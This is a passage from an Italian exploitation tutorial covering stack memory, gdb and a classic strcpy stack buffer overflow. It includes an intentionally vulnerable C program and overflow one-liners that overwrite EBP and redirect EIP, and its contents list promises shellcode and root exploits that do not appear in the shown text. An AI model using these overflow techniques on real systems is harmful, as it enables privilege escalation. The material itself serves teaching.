@@ -1,0 +1,3150 @@
+ Titolo: Appunti sull'exploiting
+ Autore: Marco Costantino
+
+ Mail: marco.costantino@ymail.com
+
+[===-0x00 Indice:-========================================================]
+
+	0-1. Introduzione
+	0-1.1 Prerequisiti
+
+	0-2. Organizzazione della memoria di un processo
+	0-2.1 Lo Stack
+	0-2.2 Processo teorico di lavoro
+	0-2.3 Processo pratico (e introduzione al debugging)
+
+	0-3. Stack Buffer Overflows
+	0-3.1 strcpy() Bug (overflow.c)
+	0-3.2 Dirottiamo il programma (eip, ebp)
+	0-3.3 Funzioni pericolose
+
+	0-4. Shellcoding
+	0-4.1 NULL opcodes
+	0-4.2 execve("/bin/sh"); shellcode
+	0-4.3 Automatizzare il recupero degli OPCODE (opcode.c)
+	0-4.4 Possibili approfondimenti (a carico vostro)
+
+	0-5. Get the box! 
+	0-5.1 Shellcode injection 
+	0-5.2 L'uso dei NOPs (Sled)
+	0-5.3 Local root exploit (overflow.c)
+	0-5.4 Analisi di un attacco remoto
+
+ -------------------------------------------------------------------------
+
+	1-1 Preparazione all'argomento (heap-based overflows)
+	1-1.1 Organizzazione della memoria di un processo (approfondimento)
+	1-1.2 HEAP
+	1-1.3 ELF (Executable and Linkable Format)
+	
+	1-2. Heap Overflows
+	1-2.1 Sovrascrizione di variabili
+	1-2.2 Sovrascrizione di puntatori a funzione
+	1-2.2.1 PLT & GOT
+	1-2.2.2 Analisi via objdump di una call
+	1-2.2.3 Function Pointer exploitation (heapexp.c)
+	1-2.2.3.1 Heap-based local root exploit example
+	1-2.3 Double-free() exploitation
+
+ -------------------------------------------------------------------------
+
+	2-1 Format String
+	2-1.1 Cos'è una format string
+	2-1.2 Errori di programmazione
+
+	2-2 Exploiting
+	2-2.1 Lettura arbitraria di un indirizzo in memoria
+	2-2.2 Scrittura arbitraria su un indirizzo in memoria	
+	2-2.3 .dtors & .ctors
+	2-2.3.1 Format String root exploit (fmt-dtors.c)
+	2-2.4 Sovrascrizione indirizzi in .GOT
+	2-2.4.1 Format String root exploit (fmt-GOT.c)
+
+ -------------------------------------------------------------------------
+
+	3-1 Oltre l'exploiting convenzionale
+	
+	3-1 Non-Executable Stack
+	3-1.1 return-into-libc Exploit
+
+
+[===-0x01 Introduzione-===================================================]
+
+ Sono le 2 di notte del 15 Luglio, oggi devo aver bevuto troppi caffè.. 
+ e così decido di iniziare a scrivere l'ennesimo testo sui problemi di 
+ sicurezza riguardanti l'abuso della gestione di memoria di un processo 
+ in runtime per trarne profitti personali..
+ Si parla di stack, di buffer overflow.. in parole più semplici e 
+ generiche, affronteremo il metodo più comune per sfruttare 
+ un tipo di errore di programmazione che può consentire ad un 
+ malintenzionato (noi) di acquisire i privilegi di amministratore su un 
+ sistema, sia per via locale che remota.
+ 
+ Questo testo non vuole essere l'ennesima banalità, e nemmeno una 
+ collezione di descrizioni enciclopediche..
+ E' proprio da questo lato che differisce, il testo è stato infatti 
+ scritto al fine di rendere possibile la comprensione dell'argomento
+ trattato ad un range di lettori più ampio possibile.
+
+[===-0x01a Pre-requisiti-=================================================]
+
+ Discreta conoscenza del linguaggio C
+ Discreta conoscenza dei sistemi operativi unixlike
+ Del tempo libero e una buona dose di lucidità
+
+
+[===-0x02 Organizzazione della memoria di un processo-====================]
+
+ Nel momento in cui un processo è in esecuzione (runtime), questo lavora 
+ su di un'area di memoria dedicata, molto ben strutturata, dove scrive 
+ e legge dati in continuazione.
+ Questa memoria virtuale è suddivisa in segmenti dedicati, e si può 
+ rappresentare in questo modo:
+
+ [indirizzi di memoria alti]
+		STACK
+		HEAP
+		.DATA Segment
+		.TEXT Segment (codice)
+ [indirizzi bassi]
+
+ .TEXT Segment 
+ E' il segmento contenente il codice eseguibile, è accessibile in 
+ sola lettura per evitare sovrascritture accidentali e non, che comporterebbero 
+ un cambiamento nel comportamento del programma in esecuzione. 
+ Ogni tentativo di sovrascrittura comporterà l'immediata terminazione 
+ del programma per via di un SIGSEGV (Segmentation Fault) 
+ ovvero violazione della segmentazione.
+
+ .DATA Segment 
+ Contiene i dati inizalizzati e non inizializzati, in particolare 
+ quelle che in programmazione chiamiamo variabili globali e 
+ variabili statiche
+
+ l'HEAP
+ Non è altro che un'estensione dinamica del .DATA, gestisce la memoria 
+ allocata dinamicamente dal processo
+
+ STACK Segment 
+ Ovvero il cuore di questo testo, viene utilizzato per memorizzare 
+ un istantanea delle condizioni attuali del processo quando quest'ultimo 
+ necessita di passare ad un punto remoto dello stesso programma, 
+ ad esempio, quando si effettua la chiamata ad una funzione interna 
+ che una volta terminata dovrà ritornare al punto di origine.
+ Viene usato inoltre per la memorizzazione di paramatri da passare a 
+ funzioni e per le variabili locali.
+
+
+[===-0x02a Lo Stack-======================================================]
+
+ Il segmento di Stack è una zona di memoria che segue la modalità di coda, 
+ LIFO (Last in First Out) ovvero "ultimo ad entrare, primo ad uscire", 
+ è così infatti che lo stack cresce dall'alto verso il basso 
+ (in riferimento agli indirizzi di memoria) o dal basso verso l'alto, 
+ a seconda del tipo di implementazione (processore, sistema operativo ecc.), 
+ seguendo l'unica regola comune che vede l'ultimo oggetto inserito come 
+ il primo a dover essere rimosso. 
+ I due comandi più importanti per interagire con lo stack sono PUSH e POP, 
+ il primo consente di aggiungere dati nello stack e il secondo di rimuoverli, 
+ ben formulata è l'osservazione trovata su wikipedia, 
+ 'Se ad ogni operazione di PUSH nello stack non corrisponde un'opportuno 
+ numero di operazioni di POP questo può continuare a lievitare
+ fino a giungere a sovrascrivere le informazioni del programma'.
+
+ Per ambientarsi dentro lo stack esistono dei registri, 
+ nelle architetture x86 troviamo tra i più importanti, 
+ un Base Pointer (ebp) che punta all'inizio della porzione di stack 
+ che si sta utilizzando, ed uno Stack Pointer (esp) che invece ci permette 
+ di scorrere lo stack a nostro piacimento per prelevare od inserire dati 
+ in un punto preciso dello stack stesso. 
+ La distanza che si crea tra EBP e ESP è detta 'offset'.
+
+ La nostra attuale idea di stack è quindi rappresentabile graficamente 
+ in questo modo:
+
+			[EBP] inizio stack
+ 	oggetto #0
+	oggetto #1
+	oggetto #2	[ESP] posizione corrente dentro lo stack
+	oggetto #3
+	oggetto #4
+
+
+[===-0x02b Processo teorico di lavoro-====================================]
+
+ Prima di andare a toccare altri registri e funzioni, vediamo di 
+ analizzare il processo teorico che si compie nello stack nel momento in 
+ cui si passa da una funzione ad un altra.
+
+ via PUSH (comando che consente di aggiungere dati nello stack) si salva 
+ l'EBP corrente, quindi si copia ESP (posizione corrente nello stack) 
+ in EBP, in modo da indicare una nuova posizione 'base' della 
+ porzione di stack nel quale stiamo lavorando, 
+ e infine sottrarre la dimensione totale delle variabili allocate alla 
+ dimensione di ESP.
+
+
+[===-0x02c Processo pratico (e introduzione al debugging)-================]
+
+ Per andare a vedere cosa succede riproducendo un analoga situazione 
+ pratica al nostro ipotetico scenario teorico (vedi sopra), 
+ sarà necessario l'uso di un debugger.
+
+ Un debugger è un programma di sviluppo nato per l'analisi di un processo 
+ in runtime, tutto il codice macchina interpretato dal processore
+ durante l'esecuzione di un programma, viene tradotto tipicamente 
+ in linguaggio assembly da un programma interno al debugger, 
+ chiamato 'disassembler', e visualizzato sullo schermo per permetterne
+ una analisi accurata da parte del programmatore.
+ Durante la fase di debugging possiamo visualizzare i registri del processore,
+ bloccare momentaneamente il processo quando desiderato (breakpoints),
+ e in alcuni casi agire sul contenuto di alcune locazioni di memoria.
+
+ In questo testo faremo riferimento al debugger più usato dagli utenti Linux,
+ il GDB.
+ Man page:
+
+       The purpose of a debugger such as GDB is to allow you to see
+       what is going on ``inside'' another program while it executes--or
+       what another program was doing at the moment it crashed.
+
+ Questa definizione tradotta in italiano, significa:
+
+       Lo scopo di un debugger come GDB è quello di permettere all'utente
+       di analizzare cosa succede all'interno di un altro programma
+       in esecuzione, o cosa quest'altro programma faceva nel momento
+       in cui è crashato.
+
+ Già, come è facilmente intuibile dal nome, un debugger, esiste 
+ sostanzialmente per eliminare i bug presenti nel programma, permettendo
+ al programmatore di risalire alla causa e all'errore commesso..
+ O permettendo a dei simpatici individui, di approfittare maliziosamente 
+ del bug trovato.
+
+ E ora vediamo che succede in pratica, durante l'esecuzione di hello.c
+
+ /* hello.c from (in)sicurezza informatica di Marco Costantino */
+
+ void hello();
+ int main(void) {
+ 	hello();
+ 	return 0;
+ }
+
+ void hello(void) {
+ 	char messaggio[12]="hello world";
+
+ 	printf("%s\n", messaggio);
+
+ }
+
+ sperando non ci siano problemi di comprensione nel listato del programma,
+ (e se ci sono sarebbe meglio se tornaste a giocare coi lego =)), 
+ compiliamo il programma, ed eseguiamolo con il debugger GDB..
+ 
+ (N.B.): la char messaggio è di 12 caratteri, e la stringa "hello world"
+         ne ha 11, questo occorre perchè durante l'inizializzazione della
+         variabile, viene aggiunto un byte di fine stringa ovvero '\0'
+
+ evil@eviltime:~$ gdb
+ GNU gdb 6.4
+ Copyright 2005 Free Software Foundation, Inc.
+ GDB is free software, covered by the GNU General Public License, and you are
+ welcome to change it and/or distribute copies of it under certain conditions.
+ Type "show copying" to see the conditions.
+ There is absolutely no warranty for GDB.  Type "show warranty" for details.
+ This GDB was configured as "i486-slackware-linux".
+ (gdb) 
+
+ Bene il debugger sta aspettando i nostri comandi, i due comandi iniziali da 
+ impartire al gdb sono:
+ 	file <nome file>: per specificare quale è il programma da analizzare
+ 	run: per l'esecuzione del programma da parte del debugger
+        disas <funzione>: disassembla la funzione specificata
+
+ (gdb) file hello
+ Reading symbols from /root/hello...done.
+ (gdb) run
+ Starting program: /root/hello hello
+ hello world
+
+ Program exited normally.
+ (gdb)
+
+ in questo momento il debugger aspetta per le operazioni da effettuare
+ sul programma vediamo come estrarre le operazioni assembly effettuate dal
+ processore, nella fase di main():
+
+ (gdb) disas main
+ Dump of assembler code for function main:
+ 0x080483a4 <main+0>:    push   %ebp
+ 0x080483a5 <main+1>:    mov    %esp,%ebp
+ 0x080483a7 <main+3>:    sub    $0x8,%esp
+ 0x080483aa <main+6>:    and    $0xfffffff0,%esp
+ 0x080483ad <main+9>:    mov    $0x0,%eax
+ 0x080483b2 <main+14>:   add    $0xf,%eax
+ 0x080483b5 <main+17>:   add    $0xf,%eax
+ 0x080483b8 <main+20>:   shr    $0x4,%eax
+ 0x080483bb <main+23>:   shl    $0x4,%eax
+ 0x080483be <main+26>:   sub    %eax,%esp
+ 0x080483c0 <main+28>:   call   0x80483cc <hello>
+ 0x080483c5 <main+33>:   mov    $0x0,%eax
+ 0x080483ca <main+38>:   leave
+ 0x080483cb <main+39>:   ret
+ End of assembler dump.
+
+ per gli estranei all'assembly tutto questo sembrerà parte di un criptico
+ documento alieno.. in realtà un senso lo ha, e siccome ho promesso di
+ non dare nulla (o quasi) per scontato, vediamo con pazienza di analizzare
+ i passi compiuti dal processore in questa istanza del programma..
+
+ <main+0>:    push   %ebp  ; salva l'EBP iniziale nello stack
+ <main+1>:    mov    %esp,%ebp  ; copia il valore corrente di ESP in EBP
+ <main+3>:    sub    $0x8,%esp  ; sottrae dall'ESP i byte necessari alle
+                                ; variabili della funzione
+
+ Tutto già detto al punto (2.2) ricordate? ;)
+
+ <main+6>:    and    $0xfffffff0,%esp
+ <main+9>:    mov    $0x0,%eax  ; azzera l'accumulatore
+ <main+14>:   add    $0xf,%eax  ; somma il contenuto dell'accumulatore
+                                ; con 0xf e lo salva nell'accumulatore
+ <main+17>:   add    $0xf,%eax  ; idem... (0xf+0xf), ora eax è uguale a
+                                ; 0x1e ovvero, 11110 in binario
+ <main+20>:   shr    $0x4,%eax  ; shifta a destra il contenuto di eax
+ <main+23>:   shl    $0x4,%eax  ; shifta a sinistra il contenuto di eax,
+                                ; abbiamo quindi 10000 ovvero 16
+ <main+26>:   sub    %eax,%esp  ; alloca 16 bit nello stack
+
+
+ tutta questa parte, sono operazioni formali aggiunte dal compilatore (gcc 3.4.6),
+ necessarie al corretto funzionamento ma inutili per la nostra comprensione,
+ queste operazioni oltretutto cambiano a seconda del compilatore usato,
+ con gcc 4.x.x ad esempio, troviamo operazioni 'formali' totalmente diverse.
+ qui di seguito lascio una breve spiegazione di ognuno dei comandi visti
+ (secondo la sintassi AT&T):
+
+ MOV source,dest
+ copia source in destination, dove source può essere un valore numerico, 
+ un registro, o un'area di memoria, e destination è un registro
+ o un area di memoria
+
+ 'mov	$0x0, %eax'
+ ad esempio azzera EAX (detto registro accumulatore) perchè ne copia 
+ dentro il valore esadecimale 0x0 che è il corrispettivo decimale dello 0
+
+ PUSH object
+ consente l'inserimento di un oggetto dentro lo STACK. l'oggetto può essere
+ un registro o il contenuto di una locazione di memoria)
+
+ 'push   %ebp' salva il registro EBP nello stack
+
+ POP object (è l'inverso di PUSH, ovvero rimuove un oggetto dallo STACK)
+
+ ADD val1,val2 (somma val1 + val2 e salva il risultato in val2, val1 può 
+		essere un valore immediato un registro o il contenuto di 
+		una locazione di memoria, mentre val2 può essere un registro 
+		o un indirizzo di memoria)
+
+ SUB val1,val2 (sottrae val1 - val2 e salva il risultato in val2, 
+		gli oggetti possibili sono gli stessi che troviamo 
+		nella funzione ADD)
+
+ SHL val, dest (effettua una traslazione logica del contenuto di 'dest'
+		verso sinistra per 'val' volte, ponendo il risultato della 
+		traslazione in 'dest');
+
+ SHR val, dest (idem ma verso destra)
+
+ E ora veniamo al punto migliore:
+
+ <main+28>:   call   0x80483cc <hello>
+
+ Prima di descrivere il perchè e il come di questa importantissima funzione, 
+ definiamo un nuovo registro delle architetture x86:
+
+ EIP, ovvero Instruction Pointer, è il registro che punta sempre alla prossima 
+ istruzione che il processore dovrà eseguire, viene quindi aggiornato ad ogni 
+ istruzione eseguita e richiamato dal processore ogni volta che si dovrà eseguire 
+ un'istruzione (per comprendere dove è situata in memoria), 
+
+ Qui viene effettuata una CALL (chiamata) alla funzione hello, 
+ la funzione CALL si occupa di saltare  alla funzione residente nell'indirizzo 
+ di memoria specificato, in questo caso 0x80483cc, a livello più basso la call 
+ si limita a salvare gli indirizzi di ritorno in cima allo stack 
+ (push %eip e %ebp) che serviranno alla funzione RET (che vedremo tra poco) 
+ per ritornare al punto  di origine della chiamata alla nuova funzione 
+ (dove ci troviamo in quell'istante) in modo da continuare ad eseguire 
+ il listato esecutivo dal punto esatto dopo la CALL.
+
+ Dopo questa call a hello, verrà quindi salvato il vecchio valore di 
+ EIP nello stack e assegnato un nuovo EIP interno alla funzione hello 
+ (indirizzi che corrispondono ai listati disassemblati):
+
+ eip = 0x80483d2 in hello; saved eip 0x80483c5
+ 
+ il registro EIP è molto importante, poichè è il registro che ci permetterà 
+ di portare a termine l'attacco protagonista di questo testo, il "buffer overflow".
+
+ Ma ora smettiamo di sognare, ci sono ancora pagine e pagine di studio 
+ prima di arrivare a questo ;).
+ Vediamo quindi le istruzioni ASM impartite al processore durante 
+ l'esecuzione della funzione hello() chiamata dalla CALL
+
+ (gdb) disas hello
+ Dump of assembler code for function hello:
+ 0x080483cc <hello+0>:   push   %ebp
+ 0x080483cd <hello+1>:   mov    %esp,%ebp
+ 0x080483cf <hello+3>:   sub    $0x18,%esp
+ 0x080483d2 <hello+6>:   mov    0x8048504,%eax
+ 0x080483d7 <hello+11>:  mov    %eax,0xffffffe8(%ebp)
+ 0x080483da <hello+14>:  mov    0x8048508,%eax
+ 0x080483df <hello+19>:  mov    %eax,0xffffffec(%ebp)
+ 0x080483e2 <hello+22>:  mov    0x804850c,%eax
+ 0x080483e7 <hello+27>:  mov    %eax,0xfffffff0(%ebp)
+ 0x080483ea <hello+30>:  sub    $0x8,%esp
+ 0x080483ed <hello+33>:  lea    0xffffffe8(%ebp),%eax
+ 0x080483f0 <hello+36>:  push   %eax
+ 0x080483f1 <hello+37>:  push   $0x8048510
+ 0x080483f6 <hello+42>:  call   0x80482b8 <printf@plt>
+ 0x080483fb <hello+47>:  add    $0x10,%esp
+ 0x080483fe <hello+50>:  leave
+ 0x080483ff <hello+51>:  ret
+ End of assembler dump.
+
+ Nelle prime 3 righe troviamo una situazione già incontrata 
+ in precedenza, salviamo ebp, copiamo il valore di esp nell'ebp, 
+ e poi allochiamo con 'sub' lo spazio necessario alle variabili 
+ (char messaggio[12])
+ 
+ Adesso seguono invece queste 'strane' istruzioni ridondanti
+
+ 0x080483d2 <hello+6>:   mov    0x8048504,%eax        ; copio la locazione di memoria nell'accumulatore
+ 0x080483d7 <hello+11>:  mov    %eax,0xffffffe8(%ebp) ; copio l'accumulatore in ebp+0xffffffe8
+ 0x080483da <hello+14>:  mov    0x8048508,%eax        ; uguale a sopra
+ 0x080483df <hello+19>:  mov    %eax,0xffffffec(%ebp)
+ 0x080483e2 <hello+22>:  mov    0x804850c,%eax
+ 0x080483e7 <hello+27>:  mov    %eax,0xfffffff0(%ebp)
+
+ non sono nient'altro che dei PUSH, ma cosa mai andrà a 
+ salvare nello stack?
+ beh esiste un comando nel gdb che ci consente di vedere 
+ il contenuto di una locazione di memoria:
+
+ (gdb) x/x 0x8048504
+ 0x8048504 <_IO_stdin_used+4>:   0x6c6c6568
+ (gdb) x/x 0x8048508
+ 0x8048508 <_IO_stdin_used+8>:   0x6f77206f
+ (gdb) x/x 0x804850c
+ 0x804850c <_IO_stdin_used+12>:  0x00646c72
+
+ o
+
+ (gdb) x/3 0x8048504
+ 0x8048504 <_IO_stdin_used+4>:   0x6c6c6568      0x6f77206f      0x00646c72
+
+ ed ecco scoperto cosa sta facendo il processore, 
+ sta salvando nello stack il contenuto della nostra char!, 
+ sono infatti 12byte (4+4+4), se fosse stata una char di 
+ 16 caratteri sarebbero stati 4 i cicli di push 
+ (4+4+4+4) e così via..
+
+ 0x080483ea <hello+30>:  sub    $0x8,%esp              ; padding
+ 0x080483ed <hello+33>:  lea    0xffffffe8(%ebp),%eax  ; faccio puntare eax a ebp+0xffffffe8
+ 0x080483f0 <hello+36>:  push   %eax                   ; salvo l'accumulatore nello stack
+ 0x080483f1 <hello+37>:  push   $0x8048510             ; pusho un indirizzo di memoria
+ 0x080483f6 <hello+42>:  call   0x80482b8 <printf@plt> ; chiamo printf con i parametri appena pushati
+
+ Il primo SUB serve per Padding, ovvero la creazione di margini 
+ convenzionali all'interno della memoria, il secondo passaggio vede 
+ l'uso di LEA, ovvero, Load Effective Address..
+ Dopo di chè viene pushato EAX nello stack, e un indirizzo di memoria 
+ che indica la locazione della nostra char, 
+ infine si chiama printf con i seguenti parametri, printf("%s\n", message);
+
+ Ora veniamo finalmente alla fine della chiamata dove vediamo 
+ protagoniste 3 funzioni importantissime
+
+ 0x080483fb <hello+47>:  add    $0x10,%esp
+ 0x080483fe <hello+50>:  leave
+ 0x080483ff <hello+51>:  ret
+
+ con ADD deallochiamo lo spazio che avevamo riservato alle variabili, 
+ con LEAVE rispristiniamo EBP ed ESP coi valori rispettivi alla funzione 
+ chiamante, e per ultimo RET che ripristina EIP (di cui avevamo già
+ parlato).
+
+ Ora siamo ritornati a main() e troviamo le ultime istruzioni di uscita:
+
+ 0x080483c5 <main+33>:   mov    $0x0,%eax  ; azzero l'accumulatore EAX
+ 0x080483ca <main+38>:   leave
+ 0x080483cb <main+39>:   ret
+
+ Perfetto, ce l'abbiamo fatta ;)
+ Spero di essere riuscito a spiegare al dettaglio ogni passaggio senza 
+ aver confuso troppo le idee,
+ se è stato così allora si può proseguire con la parte più interessante 
+ di questo testo..
+ 
+
+[===-0x03 Buffer Overflows-===============================================]
+
+ Finalmente al cuore del testo.., quindi, cosè un buffer overflow? 
+ ma prima di tutto cosè un 'buffer'?
+ Un buffer è un insieme di blocchi di memoria contigui che contengono 
+ lo stesso tipo di dati, in programmazione possiamo quindi identificarlo 
+ in un array (vettore):
+
+ - char array[5], la lunghezza del buffer sarà di 5 e conterrà solo caratteri
+ - int array[5], stessa lunghezza ma potrà contenere solo numeri interi
+
+ Questo vettore, (ad es.) 'int array[5]', verrà allocato nello stack 
+ all'inizio del programma  (o della funzione), proprio tra EBP ed ESP, 
+ costruendo il seguente scenario all'interno della segmentazione:
+
+			[EBP]
+	array[4]
+	array[3]
+	array[2]
+	array[1]
+	array[0]
+			[ESP]
+
+ Overflow, direttamente tradotto dall'inglese significa "straboccare".. 
+ nel nostro caso, un buffer overflow avviene quindi nel momento in cui 
+ cercheremo di scrivere dati nel buffer oltre il quantitativo di memoria 
+ che gli appartiene.
+
+
+[===-0x03a strcpy() Bug (overflow.c)-=====================================]
+
+ Finiti i tempi di gets() (e chi non capisce capirà ;)), la funzione più 
+ comunemente soggetta a trovarsi causa del problema è la strcpy(), 
+ la sintassi di questa funzione è la seguente:
+
+       strcpy(dest, source); // dove dest e source sono CHAR
+
+ non è niente di complicato, si occupa semplicemente di copiare
+ il contenuto della char 'source' dentro la char 'dest' includendo 
+ il carattere di fine stringa (già visto in precedenza), SENZA effettuare
+ alcun controllo sulla quantità di bytes passati da una stringa all'altra..
+
+ $ man strcpy
+ BUGS
+	If the destination string of a strcpy() is not large enough 
+	(that is, if the programmer was stupid/lazy, and failed to check 
+	the size before copying) then  anything  might  happen.
+	Overflowing  fixed  length strings is a favourite cracker technique.
+
+ da questa 'quote' presa dalla pagina del man di strcpy, possiamo 
+ partire a parlare in azione pratica di ciò che succede allo stack quando 
+ induciamo un buffer overflow..
+
+ Programma vulnerabile d'esempio:
+ 
+ #include <stdio.h>
+ #include <string.h>
+
+ int main(int argc, char *argv[]) { 
+	char s2[20];
+
+	if(argv[1]) {
+		strcpy(s2,argv[1]);
+		printf("%s\n",s2);
+	}
+	return 0;
+ }
+
+ compilando ed eseguendo il programma otterremo il seguente output:
+
+ evil@eviltime:~$ ./vuln marco
+ marco
+
+ il programma non fà altro che stampare ciò che passiamo come parametro 
+ prima dell'esecuzione, ma vediamo adesso cosa succede se passiamo 
+ un parametro superiore ai byte allocati per il buffer, possiamo provare 
+ con 48 (spiegherò in seguito la scelta di questa quantità).. 
+ per fare questo non batteremo sulla tastiera il dito indice per 48 volte, 
+ ma ci serviremo di una chiamata al perl per far inserire a lui 48 volte 
+ il carattere "A" nell'input..
+
+ evil@eviltime:~$ ./vuln `perl -e 'print "A" x 48'`
+ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+ Segmentation fault
+
+ eccoci!, il processo ha violato la segmentazione, (dopo spiegherò 
+ perchè ho usato proprio 48 byte) ma vediamo cosa è successo all'interno 
+ dello stack e quindi cosa ha realmente comportato questa reazione.. 
+ (usando gdb)
+
+ (gdb) r `perl -e 'print "A" x 48'`
+ Starting program: /root/vuln `perl -e 'print "A" x 48'`
+ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+ Program received signal SIGSEGV, Segmentation fault.
+ 0x41414141 in ?? ()
+
+ analizziamo il contenuto dei registri usati dal programma:
+
+ (gdb) info reg
+ eax            0x0      0
+ ecx            0x0      0
+ edx            0x31     49
+ ebx            0x4015bff0       1075167216
+ esp            0xbffff550       0xbffff550
+ ebp            0x41414141       0x41414141    ; eccoci
+ esi            0xbffff5a0       -1073744480
+ edi            0x2      2
+ eip            0x41414141       0x41414141    ; eccoci per la seconda volta
+ eflags         0x210282 2163330
+ cs             0x23     35
+ ss             0x2b     43
+ ds             0x2b     43
+ es             0x2b     43
+ fs             0x0      0
+ gs             0x0      0
+
+ è facile notare come sia "ambiguo" il contenuto dei registri 
+ EBP ed EIP, quel 41 così tanto ripetuto per i 4byte di registro (32bit), 
+ corrisponde al codice ASCII della lettera 'A', proprio quella che noi 
+ abbiamo tanto ripetuto nel buffer.
+ Che è successo?, beh il parametro passato da noi ha oltrepassato i 
+ limiti prefissati nel buffer andando a sovrascrivere i registri 
+ più vicini, EBP ed EIP..
+
+ Ora possiamo 'giocare' un pò con questi registri, e incominciare a 
+ capire quindi l'utilità pratica di quest'attacco..
+
+
+[===-0x03b Dirottiamo il programma (eip, ebp)-============================]
+
+
+ Come promesso ora spiegherò la scelta dei 48 byte di parametro.
+ Solitamente questo valore di bytes viene "forzato" ovvero si prova a 
+ segfaultare il programma (provocare una violazione di segmentazione), 
+ inserendo nel buffer X bytes finchè il programma non commette l'errore 
+ voluto, quindi si "scala" di bytes sino a quanto basta per sovrascrivere 
+ EIP.
+ Ma qui è diverso, qui abbiamo il sorgente, e una sola variabile.. 
+ disassembliamo main:
+
+ (gdb) disas main
+ Dump of assembler code for function main:
+ 0x080483d4 <main+0>:    push   %ebp
+ 0x080483d5 <main+1>:    mov    %esp,%ebp
+ 0x080483d7 <main+3>:    sub    $0x28,%esp
+
+ Ci fermiamo qui, perchè l'unica linea che ci interessa è la terza, 
+ ovvero l'allocazione dello spazio nello stack riservato alla variabile.. 
+ 
+ sub    $0x28,%esp
+
+ 0x28 non è nient'altro che il numero esadecimale 28, che tradotto 
+ in decimale corrisponde al numero 40, nel nostro 'overflow.c' basterà 
+ quindi inserire nel buffer anche un solo byte in più e sfoceremo 
+ sovrascrivendo i registri..
+ Questa fà parte delle operazioni di padding effettuate dal compilatore, 
+ è quindi possibile che utilizzando un'altro software di compilazione 
+ o un'altra versione del GCC i margini convenzionali siano maggiori
+ o minori, motivo in più per il quale dovete applicarvi e non limitarvi a 
+ memorizzare quanto scritto in questo testo.
+ I registri vengono sovrascritti in quest'ordine EBP->EIP, possiamo 
+ quindi immaginare un disegno di questo tipo:
+
+ [<------buffer------>][<-EBP->][<-EIP->]
+       (40 bytes)      (4 bytes)(4 bytes)
+
+ Secondo la nostra rappresentazione immaginaria, aggiungendo 4 bytes 
+ ai 40 del buffer, e quindi passando al programma 44 bytes di parametro, 
+ dovremo sovrascrivere solo EBP lasciando integro EIP... e così sarà..
+
+ (gdb) r `perl -e 'print "A" x 44'`
+ Starting program: /root/sure `perl -e 'print "A" x 44'`
+ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
+
+ Program received signal SIGILL, Illegal instruction.
+
+ (gdb) x/x $ebp
+ 0x41414141:     0x00000000 
+ (gdb) x/x $eip
+ 0x40047200 <__libc_start_main+16>:      0x81ffffff
+
+ Era stato tutto previsto, EBP è stato sovrascritto mentre EIP no..
+ Vediamo ora di giocare con questi registri per comprendere meglio a 
+ cosa servono realmente, proviamo ad esempio a passare 48bytes, 
+ 44 contenenti la lettera 'A' e gli altri 4 contenenti un indirizzo 
+ valido per EIP...
+
+ Innanzitutto prendiamo il valore valido per EIP, 
+
+ Passo #1, caricare e lanciare il programma con GDB, quindi impostare 
+ un qualunque breakpoint
+
+ (gdb) r ciao
+ Starting program: /root/sure AAA
+ ciao
+
+ Program exited normally.
+ (gdb) b printf
+ Breakpoint 1 at 0x400768b3
+
+ Passo #2, lanciare nuovamente il programma che si fermerà 
+ all'incrocio con printf()
+
+ (gdb) r
+ Starting program: /root/sure ciao
+
+ Breakpoint 1, 0x400768b3 in printf () from /lib/libc.so.6
+ 
+ Passo #3, quindi proseguire con il comando 's' (step) sino ad arrivare
+ all'istruzione più vicina alla fine del programma, dove EIP punterà 
+ quindi alla funzione di uscita.
+ 
+ (gdb) step
+ Single stepping until exit from function printf,
+ which has no line number information.
+ ciao
+ 0x08048423 in main ()
+ (gdb) step
+ Single stepping until exit from function main,
+ which has no line number information.
+ 0x4004728b in __libc_start_main () from /lib/libc.so.6
+
+ Passo #4, segnarsi l'attuale indirizzo puntato da EIP 
+ (va bene anche scriverlo a penna ;)
+
+ (gdb) x/x $eip
+ 0x4004728b <__libc_start_main+155>:     0xe8240489
+
+ Ora abbiamo un indirizzo valido da poter assegnare ad EIP, ovviamente 
+ non possiamo scrivere in chiaro l'indirizzo dentro il parametro 
+ perchè altrimenti ogni carattere verrebbe interpretato come ASCII 
+ e avremo un'altra uscita in segmentation fault.
+
+ Per evitare questo dobbiamo prendere l'indirizzo EIP appena trovato e 
+ tradurlo in 'little endian' ovvero il metodo utilizzato dal processo 
+ per immagazzinare l'indirizzo di memoria:
+
+ Si prende l'indirizzo che abbiamo trovato, si toglie "0x" e lo si 
+ divide in coppie:
+
+ prima: 0x4004728b 
+ dopo: 40 04 72 8b
+
+ E infine lo si ribalta: 8b 72 04 40
+ a questo punto per passarlo come parametro dobbiamo dirgli che sono 
+ dati in esadecimale (HEX) altrimenti verrebbero interpretati come ASCII, 
+ per fare questo ci basta chiamare printf() e aggiungere prima di ogni 
+ coppia di caratteri questo identificatore '\x'.. la stringa diventerà
+ quindi la seguente 
+
+ \x8b\x72\x04\x40
+
+ adesso facciamo ripartire il programma con gdb passandogli la nostra
+ stringa appena creata, che vedrà 44bytes contenenti la lettera 'A', 
+ e 4 bytes contenenti il nuovo indirizzo da sovrascrivere su EIP, 
+ se i nostri calcoli sono stati fatti nel modo corretto, il programma 
+ dovrebbe uscire senza conseguire alcuna violazione della segmentazione, 
+ poichè l'EIP sovrascritto contiene un indirizzo valido.
+
+ (gdb) r `perl -e 'print "A" x 44'``printf "\x8b\x72\x04\x40"`
+ Starting program: /root/sure `perl -e 'print "A" x 44'``printf "\x8b\x72\x04\x40"`
+ AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAr@
+
+ Program exited normally.
+
+ BINGO!, il programma ha usato il nostro EIP evitando di violare la 
+ memoria del processo stesso..
+ Immaginate (o realizzate direttamente al capitolo 5) se facessimo 
+ puntare EIP a delle istruzioni passate da noi, verrebbero eseguite 
+ con i permessi del programma... immaginate immaginate, la soluzione 
+ è nei prossimi 2 capitoli ;)
+ 
+ 
+[===-0x03c Funzioni Pericolose-===========================================]
+
+ Le funzioni protagoniste in questi scenari, sono tutte quelle funzioni
+ che operano con l'input senza fare controlli sulle dimensioni dei 
+ dati trasferiti...
+ Tra queste troviamo:
+
+	gets()
+	sprintf()
+	strcat()
+	strcpy()
+	streadd()
+	strecpy()
+	strtrns()
+	index()
+	fscanf()
+	scanf()
